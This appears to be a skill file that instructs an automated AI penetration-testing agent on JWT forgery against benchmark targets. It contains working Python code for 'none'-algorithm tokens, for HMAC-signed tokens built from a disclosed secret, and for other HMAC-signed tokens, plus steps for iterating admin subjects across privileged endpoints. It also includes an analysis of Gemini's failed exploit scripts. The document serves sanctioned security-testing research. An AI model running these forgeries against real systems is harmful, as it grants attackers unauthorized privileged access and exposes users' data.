# Skill: JWT forgery via "none" algorithm OR disclosed signing secret

Vulnerability class: Auth-bypass via token forgery.

> **NOT a benchmark recipe.** Class-level technique. Anti-contamination
> guarantee: uses ONLY stdlib (`base64`, `hmac`, `hashlib`, `json`,
> `time`) — never imports `jwt`, `jose`, `passlib`, or any other
> high-level crypto library that the sandbox may not ship.

## Class signature

Matches when ANY of:

1. **JWT cookie/header observed in recon**: a value matching
   `eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*` in
   `Cookie:` headers, `Authorization: Bearer ...`, or response
   bodies. Common cookie names: `jwt`, `token`, `auth`, `session`,
   `id_token`, `access_token`.
2. **CPG LITERAL_SECRETS surfaced a signing-key shape**: a hardcoded
   string adjacent to `jwt.encode`, `jwt.decode`, `hmac.new`, or
   `hashlib.HMAC` calls. Typical patterns: `SECRET = "..."`,
   `SECRET_KEY = "..."`, `JWT_SECRET = "..."`, `app.config["SECRET_KEY"]`.
3. **Code path with alg validation gap**: a `jwt.decode(...)` call
   without `algorithms=[...]` parameter, OR with `algorithms` value
   that includes `"none"` (case-insensitive).

If none match, this skill does not apply — pivot.

## Why stdlib-only (operator-flagged 2026-05-27)

Smoke 49 / XBEN-005: Gemini wrote an exploit that did `import jwt`.
The code_exec_attack sandbox does NOT install PyJWT. Script crashed
with `ModuleNotFoundError`, then was re-dispatched verbatim 12 min
later by the specialist. **Hard rule: this skill MUST forge tokens
using stdlib only**. HS256/384/512 are trivially implementable with
`hmac.new(secret, ..., hashlib.sha256).digest()` — no library needed.

## Phase A — algorithm-confusion / none-alg test (max 4 requests)

If a JWT is observed, the FIRST test is to swap its algorithm to
`"none"` and strip the signature:

```python
import base64, json

def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")

def b64u_d(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)

# Forge: change alg to "none", strip signature
header = {"alg": "none", "typ": "JWT"}
# Re-use the decoded payload from the original token; only mutate
# the privilege-bearing claim (sub, role, is_admin, scope, etc.)
payload_orig = json.loads(b64u_d(observed_token.split(".")[1]))
payload = dict(payload_orig)
payload["sub"] = "admin"   # or "1", "0", or another role discovered in recon
payload.pop("exp", None)   # remove expiry to avoid time issues
forged = f"{b64u(json.dumps(header, separators=(',',':')).encode())}." \
         f"{b64u(json.dumps(payload, separators=(',',':')).encode())}."
```

Send the forged token to a privileged endpoint discovered in recon.
Success = HTTP 200 + body lacks the login-redirect marker. Compare
against same request WITHOUT the cookie/header to see if the auth
gate actually engaged.

## Phase B — HS256/384/512 forgery using disclosed secret (max 8 requests)

If Phase A failed (server validates algorithm) AND CPG surfaced a
LITERAL_SECRETS entry near `jwt.encode/decode` or `hmac.new`:

```python
import base64, hmac, hashlib, json, time

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")

SECRET = "a very secret key"        # literal from CPG LITERAL_SECRETS
ALG = "HS256"
ALG_HASHFN = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[ALG]

header = {"alg": ALG, "typ": "JWT"}
payload = {"sub": "admin", "exp": int(time.time()) + 3600}
# Iterate `sub` over candidate user identifiers from recon:
# - numeric IDs 1..N where N is the largest user_id observed
# - role names: "admin", "root", "administrator", "superuser"
# - usernames from seed-credential pairs in pre-recon-source
# Iterate `iat`/`nbf` claims if the original token had them.

signing_input = f"{b64u(json.dumps(header, separators=(',',':')).encode())}." \
                f"{b64u(json.dumps(payload, separators=(',',':')).encode())}"
sig = hmac.new(SECRET.encode(), signing_input.encode(), ALG_HASHFN).digest()
forged = f"{signing_input}.{b64u(sig)}"
```

For each candidate `sub`, request EVERY privileged endpoint the
route inventory exposed. Common admin path patterns: `/admin`,
`/api/admin/*`, `/users/{id}`, `/profile/{id}/edit`, `/dashboard`.

## Phase B-alt — non-JWT HMAC-signed token

If the disclosed secret signs a non-JWT shape (HMAC over query,
HMAC over body), build the equivalent with stdlib HMAC and replay
against the route that consumes it:

```python
# Example: token = base64(payload) + "." + hex(hmac_sha256(secret, payload))
import hmac, hashlib, base64
sig = hmac.new(SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
token = base64.b64encode(payload.encode()).decode() + "." + sig
```

## Mutation strategy across phases

After each forgery attempt:

1. Regex the response body for `flag\{...\}`, `xbow-[a-f0-9]+`, or
   any sensitive-data-shaped string BEFORE calling emit helpers.
2. If response is 200 with the privileged-page content shape (look
   for admin-panel markers like "Admin Dashboard", "User List",
   "/api/admin/", or content the unauthenticated baseline doesn't
   serve), print `AEGISPT_FINDING:` JSON first, then emit.
3. If response is 401/403, the forgery was rejected — iterate the
   next `sub` candidate or algorithm.

## Script structure HARD REQUIREMENTS

After smoke 49 / XBEN-005 forensic showed a script with `def run():`
that was never called (no `if __name__ == "__main__"` block), this
skill requires:

- Script body MUST execute at module scope OR end with
  `if __name__ == "__main__": main()`.
- NO `from utils import aegispt_emit_finding` — the helper is
  injected as a script-scope builtin by SCOPE_GUARD_PREAMBLE.
- NO `import jwt`, `import jose`, `import passlib`, `import cryptography`,
  `import bcrypt`, `import paramiko`, `import requests`.
  Allowed: stdlib + `httpx` (preamble pre-imports it).
- Print `AEGISPT_FINDING:` JSON on stdout BEFORE calling
  `aegispt_emit_finding(...)` — so kwarg or serialization errors
  cannot eat the proof.

## Stop conditions

- 12 forgery attempts (3 algorithms × 4 sub candidates) without 200.
- CPG had no LITERAL_SECRETS AND no JWT observed in recon → skill
  does not apply.
- 200 + sensitive-data match → emit + exit 0.

## Anti-contamination guarantee

Subject candidates and privileged paths are pulled from the run's
own recon artifacts at script-generation time. The skill contains
zero target-specific path, username, or app-name literals. The only
hard-coded list is canonical admin-path names (`/admin`,
`/api/admin`) which are target-agnostic web conventions.

## Provenance

Format inspired by transilienceai/communitytools (MIT). Content
derived from diagnose-no-flag forensic analysis of smoke 49
(XBEN-005, 2026-05-27) where Gemini correctly identified the JWT
forgery primitive but wrote a script that (a) imported PyJWT not
in the sandbox, (b) defined `def run():` with no caller, (c)
attempted `from utils import aegispt_emit_finding` which would
have ImportError'd as a second crash had the first not happened.
